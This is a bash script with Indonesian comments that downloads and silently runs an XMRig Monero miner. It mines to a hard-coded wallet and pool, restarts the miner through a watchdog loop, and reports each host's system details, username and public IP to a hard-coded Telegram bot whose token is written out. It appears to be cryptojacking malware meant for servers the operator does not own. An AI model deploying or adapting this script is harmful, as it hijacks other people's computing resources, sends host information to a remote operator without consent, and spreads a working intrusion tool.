#!/bin/bash

# --- CONFIG ---
# rubah agar mendownload dari https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
MINER_URL="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
MINER_FILE="xmrig"
WALLET="48wk97EaXFA9Q6gTuDWu5oKLFEpPCARoyLjnJ9snWnk5LzJ2BVNrDnDBKyY8oZmYvRQ4G1D1f4AuhVhdRWYh65ud3RnpThi"
POOL="gulf.moneroocean.stream:443"
PASS="$(whoami)"
CHECK_INTERVAL=30
TELEGRAM_TOKEN="7718242724:AAHmR3eFxah3juQcpkS_AnybzsOBU3OuIPw"
TELEGRAM_CHATID="5104210301"

# --- INFO SYSTEM ---
uname_info=$(uname -a)
whoami=$(whoami)

# --- Fungsi Cetak ---
flush_output() {
    echo -e "$1"
}

# --- Get Public IP ---
get_ip() {
    if command -v curl >/dev/null 2>&1; then
        curl -s ifconfig.me || echo "unknown"
    elif command -v wget >/dev/null 2>&1; then
        wget -qO- ifconfig.me || echo "unknown"
    else
        echo "unknown"
    fi
}

# --- Kirim Telegram ---
send_telegram() {
    local MESSAGE="$1"
    local IP=$(get_ip)
    local TELEGRAM_MESSAGE="🖥️ <b>System</b>: <code>$uname_info</code>%0A👤 <b>User</b>: <code>$whoami</code>%0A🌐 <b>IP</b>: <code>$IP</code>%0A📡 <b>Status</b>: $MESSAGE"
    
    if [ -n "$TELEGRAM_TOKEN" ] && [ -n "$TELEGRAM_CHATID" ]; then
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
             -d "chat_id=$TELEGRAM_CHATID" \
             -d "text=$TELEGRAM_MESSAGE" \
             -d "parse_mode=HTML" >/dev/null 2>&1
    fi
}

# --- Cek Dependensi ---
check_dependencies() {
    for cmd in bash wget curl pgrep openssl tar; do
        if ! command -v $cmd >/dev/null 2>&1; then
            send_telegram "❌ Dependency '$cmd' tidak ditemukan."
            exit 1
        fi
    done
}

# --- Unduh Miner ---
download_miner() {
    if [ ! -f "$MINER_FILE" ]; then
        flush_output "[*] Mengunduh miner dari $MINER_URL..."
        ARCHIVE="xmrig.tar.gz"
        if wget -q -O "$ARCHIVE" "$MINER_URL" || curl -s -o "$ARCHIVE" "$MINER_URL"; then
            flush_output "[*] Mengekstrak $ARCHIVE..."
            tar -xzf "$ARCHIVE"
            if [ -f "$MINER_FILE" ]; then
                chmod +x "$MINER_FILE"
                flush_output "[✓] Miner berhasil diunduh, diekstrak, dan diberi izin eksekusi."
                rm "$ARCHIVE"  # Hapus archive setelah ekstrak untuk membersihkan
            else
                send_telegram "❌ File miner '$MINER_FILE' tidak ditemukan setelah ekstrak"
                exit 1
            fi
        else
            send_telegram "❌ Gagal mengunduh miner dari $MINER_URL"
            exit 1
        fi
    else
        flush_output "[*] File miner sudah ada, skip download."
    fi
}

# --- Jalankan Miner ---
start_miner() {
    local CMD="./$MINER_FILE --url $POOL --user $WALLET --pass $PASS --tls --cpu-max-threads-hint=100 -B"
    flush_output "[*] Menjalankan miner..."
    nohup $CMD >/dev/null 2>&1 &
    sleep 5
    if pgrep -f "$MINER_FILE" >/dev/null 2>&1; then
        send_telegram "✅ Miner berjalan di $(hostname)"
    else
        send_telegram "❌ Gagal menjalankan miner"
    fi
}

# --- Watchdog ---
watch_miner() {
    while true; do
        if ! pgrep -f "$MINER_FILE" >/dev/null 2>&1; then
            send_telegram "⚠️ Miner berhenti, mencoba menjalankan ulang..."
            start_miner
        fi
        sleep $CHECK_INTERVAL
    done
}

# --- Main ---
check_dependencies
download_miner
start_miner
watch_miner
